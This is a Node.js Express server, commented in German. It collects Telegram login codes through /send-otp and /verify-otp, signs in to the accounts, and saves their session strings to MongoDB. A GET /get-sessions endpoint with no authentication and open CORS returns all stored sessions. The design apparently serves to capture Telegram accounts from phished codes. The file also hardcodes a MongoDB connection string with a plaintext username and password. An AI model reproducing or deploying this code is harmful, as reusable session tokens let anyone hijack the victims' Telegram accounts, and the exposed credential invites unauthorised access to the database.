const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
app.use(cors());
app.use(express.json());

// MongoDB Verbindung
const MONGO_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0";
mongoose.connect(MONGO_URI).then(() => console.log("DB connected")).catch(err => console.error(err));

const SessionSchema = new mongoose.Schema({ phone: String, session: String, status: String });
const SessionModel = mongoose.model('Session', SessionSchema);

// In-Memory Speicher für temporäre Auth-Daten
let authState = {};

app.post('/send-otp', async (req, res) => {
    const { phone, apiId, apiHash } = req.body;
    try {
        const client = new TelegramClient(new StringSession(""), parseInt(apiId), apiHash, { connectionRetries: 5 });
        await client.connect();
        const { phoneCodeHash } = await client.sendCode({ apiId: parseInt(apiId), apiHash }, phone);
        authState[phone] = { phoneCodeHash, client };
        res.json({ success: true, phoneCodeHash });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    const { phone, code, phoneCodeHash } = req.body;
    const state = authState[phone];
    if (!state) return res.status(400).json({ error: "No session found" });
    try {
        await state.client.signIn({
            apiId: state.client.apiId,
            apiHash: state.client.apiHash,
            phoneNumber: phone,
            phoneCode: code,
            phoneCodeHash: phoneCodeHash
        });
        const sessionString = state.client.session.save();
        await SessionModel.create({ phone, session: sessionString, status: "Active" });
        res.json({ success: true });
    } catch (err) {
        res.status(400).json({ error: err.message });
    }
});

app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await SessionModel.find();
        res.json(sessions);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(3000, () => console.log("Server running on port 3000"));
